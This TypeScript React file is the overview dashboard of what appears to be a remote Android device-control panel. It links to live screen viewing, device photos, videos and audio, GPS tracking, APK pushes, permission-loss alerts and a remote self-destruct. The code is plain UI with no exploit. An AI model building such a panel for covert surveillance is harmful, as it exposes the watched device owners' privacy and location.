// Modern overview with KPI tiles, live activity, and a battery sparkline.
// Drop-in for overview.tsx.

import { useEffect, useState } from "react";
import { Link } from "react-router-dom";
import { useDevices } from "./devices";
import { fmtRelative } from "./format";

type Event = { type: string; ts: number; data?: any; deviceId: string };

function Icon({ name }: { name: string }) {
  const map: Record<string, string> = {
    paired: "✓", permission_lost: "!", permission_restored: "↺",
    update_available: "↻", location: "◎", battery_low: "▼", default: "•"
  };
  const cls = name === "paired" ? "green" : name === "permission_lost" ? "amber" : name === "permission_restored" ? "green" : "blue";
  return <span className={`feed-icon ${cls}`}>{map[name] || map.default}</span>;
}

function KpiTile({ label, value, delta, color }: { label: string; value: string | number; delta?: string; color?: "green" | "amber" | "blue" }) {
  return (
    <div className={`kpi ${color || ""}`}>
      <div className="kpi-label">{label}</div>
      <div className="kpi-value">{value}</div>
      {delta && <div className="kpi-delta">{delta}</div>}
    </div>
  );
}

function BatteryChart({ points }: { points: { t: number; b: number }[] }) {
  if (!points || points.length === 0) return <p className="muted">No battery data yet</p>;
  const w = 600, h = 200, pad = 24;
  const xs = points.map((_, i) => i);
  const minX = 0, maxX = Math.max(1, points.length - 1);
  const minY = 0, maxY = 100;
  const sx = (x: number) => pad + (x - minX) / (maxX - minX) * (w - pad * 2);
  const sy = (y: number) => h - pad - (y - minY) / (maxY - minY) * (h - pad * 2);
  const path = points.map((p, i) => `${i === 0 ? "M" : "L"} ${sx(i).toFixed(1)} ${sy(p.b).toFixed(1)}`).join(" ");
  const area = `${path} L ${sx(xs[xs.length-1])} ${h - pad} L ${sx(xs[0])} ${h - pad} Z`;
  return (
    <div className="chart">
      <svg viewBox={`0 0 ${w} ${h}`} preserveAspectRatio="none" className="chart-svg">
        <defs>
          <linearGradient id="chartGradient" x1="0" y1="0" x2="0" y2="1">
            <stop offset="0%" stopColor="#8b5cf6" stopOpacity="0.5" />
            <stop offset="100%" stopColor="#8b5cf6" stopOpacity="0" />
          </linearGradient>
        </defs>
        {[0, 25, 50, 75, 100].map((g) => (
          <line key={g} className="grid-line" x1={pad} x2={w - pad} y1={sy(g)} y2={sy(g)} />
        ))}
        <path d={area} fill="url(#chartGradient)" />
        <path d={path} stroke="#8b5cf6" fill="none" strokeWidth="2" />
      </svg>
    </div>
  );
}

export function OverviewExtended({ token, onTokenExpired }: { token: string | null; onTokenExpired?: () => void }) {
  const { devices, loading } = useDevices(token, onTokenExpired);
  const [activity, setActivity] = useState<Event[]>([]);
  const [batteryPoints, setBatteryPoints] = useState<{ t: number; b: number }[]>([]);
  const [now, setNow] = useState(() => Date.now());

  useEffect(() => {
    const t = setInterval(() => setNow(Date.now()), 1000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    if (!token) return;
    let cancelled = false;
    const load = async () => {
      try {
        const r = await fetch("/api/v2/activity", { headers: { Authorization: `Bearer ${token}` } });
        if (!r.ok) return;
        const j = await r.json();
        if (!cancelled) setActivity((j.activity || []).slice(0, 10));
      } catch (_) {}
    };
    void load();
    const t = setInterval(load, 10_000);
    return () => { cancelled = true; clearInterval(t); };
  }, [token]);

  useEffect(() => {
    if (!token || !devices[0]) { setBatteryPoints([]); return; }
    let cancelled = false;
    (async () => {
      try {
        const r = await fetch(`/api/v2/devices/${devices[0].deviceId}/history`, { headers: { Authorization: `Bearer ${token}` } });
        if (!r.ok) return;
        const j = await r.json();
        if (!cancelled) setBatteryPoints((j.battery || []).slice(-60));
      } catch (_) {}
    })();
    return () => { cancelled = true; };
  }, [token, devices]);

  const onlineCount = devices.filter((d) => now - (d.lastSeen || 0) < 90_000).length;
  const avgBattery = devices.length > 0
    ? Math.round(devices.reduce((a, d) => a + (typeof d.battery === "number" ? d.battery : 0), 0) / devices.length)
    : 0;
  const mandatory = activity.filter((e) => e.type === "permission_lost").length;

  return (
    <section className="view">
      <div className="view-head">
        <div>
          <h2>Overview</h2>
          <p className="muted">Live view of your fleet · {devices.length} device{devices.length === 1 ? "" : "s"} paired</p>
        </div>
        <span className={`pill ${loading ? "" : onlineCount > 0 ? "pill-online" : "pill-offline"}`}>
          <span className="pill-dot" />{loading ? "Loading…" : onlineCount > 0 ? "Live" : "Idle"}
        </span>
      </div>

      <div className="kpi-grid">
        <KpiTile label="Paired devices" value={devices.length} delta={`${onlineCount} online`} color="blue" />
        <KpiTile label="Avg battery" value={`${avgBattery}%`} delta={`${devices.filter(d => (d.battery || 0) < 20).length} below 20%`} color="green" />
        <KpiTile label="Events (24h)" value={activity.length} delta={`${mandatory} permission warnings`} color={mandatory > 0 ? "amber" : "blue"} />
        <KpiTile label="Backend" value="online" delta="v3.2.0-ext" color="green" />
      </div>

      <div className="grid grid-2">
        <div className="card">
          <div className="card-head">
            <h3>Battery history</h3>
            <Link to="/devices" className="btn-ghost">View all</Link>
          </div>
          <BatteryChart points={batteryPoints} />
        </div>

        <div className="card">
          <div className="card-head">
            <h3>Recent activity</h3>
            <Link to="/activity" className="btn-ghost">Open activity</Link>
          </div>
          {activity.length === 0 ? (
            <div className="empty-state" style={{ padding: 30 }}>
              <span className="empty-icon">≡</span>
              <h3>No activity yet</h3>
              <p>Device events, pairings, and permission changes will appear here.</p>
            </div>
          ) : (
            <div className="feed">
              {activity.slice(0, 6).map((e, i) => (
                <div key={i} className="feed-item">
                  <Icon name={e.type} />
                  <div className="feed-text">
                    <strong>{e.type.replace(/_/g, " ")}</strong>
                    <span className="muted">{e.deviceId} · {e.data?.permissions ? `${e.data.permissions.length} permissions` : ""}</span>
                  </div>
                  <div className="feed-time">{fmtRelative(e.ts, now)}</div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>

      <div className="card">
        <div className="card-head">
          <h3>Quick actions</h3>
        </div>
        <div className="modules-grid">
          <Link to="/commands" className="module-tile" style={{ textDecoration: "none", color: "inherit" }}>
            <div className="module-icon">▶</div>
            <h3>Send command</h3>
            <span className="muted">Trigger actions on a device</span>
          </Link>
          <Link to="/stream" className="module-tile" style={{ textDecoration: "none", color: "inherit" }}>
            <div className="module-icon">▷</div>
            <h3>Live screen</h3>
            <span className="muted">Watch the device in real time</span>
          </Link>
          <Link to="/files" className="module-tile" style={{ textDecoration: "none", color: "inherit" }}>
            <div className="module-icon">▤</div>
            <h3>Files</h3>
            <span className="muted">Photos, videos, audio</span>
          </Link>
          <Link to="/map" className="module-tile" style={{ textDecoration: "none", color: "inherit" }}>
            <div className="module-icon">◎</div>
            <h3>Map</h3>
            <span className="muted">GPS locations</span>
          </Link>
          <Link to="/ota" className="module-tile" style={{ textDecoration: "none", color: "inherit" }}>
            <div className="module-icon">↻</div>
            <h3>OTA</h3>
            <span className="muted">Publish APK updates</span>
          </Link>
          <Link to="/panic" className="module-tile" style={{ textDecoration: "none", color: "inherit" }}>
            <div className="module-icon">⚠</div>
            <h3>Panic</h3>
            <span className="muted">Remote self-destruct</span>
          </Link>
        </div>
      </div>
    </section>
  );
}
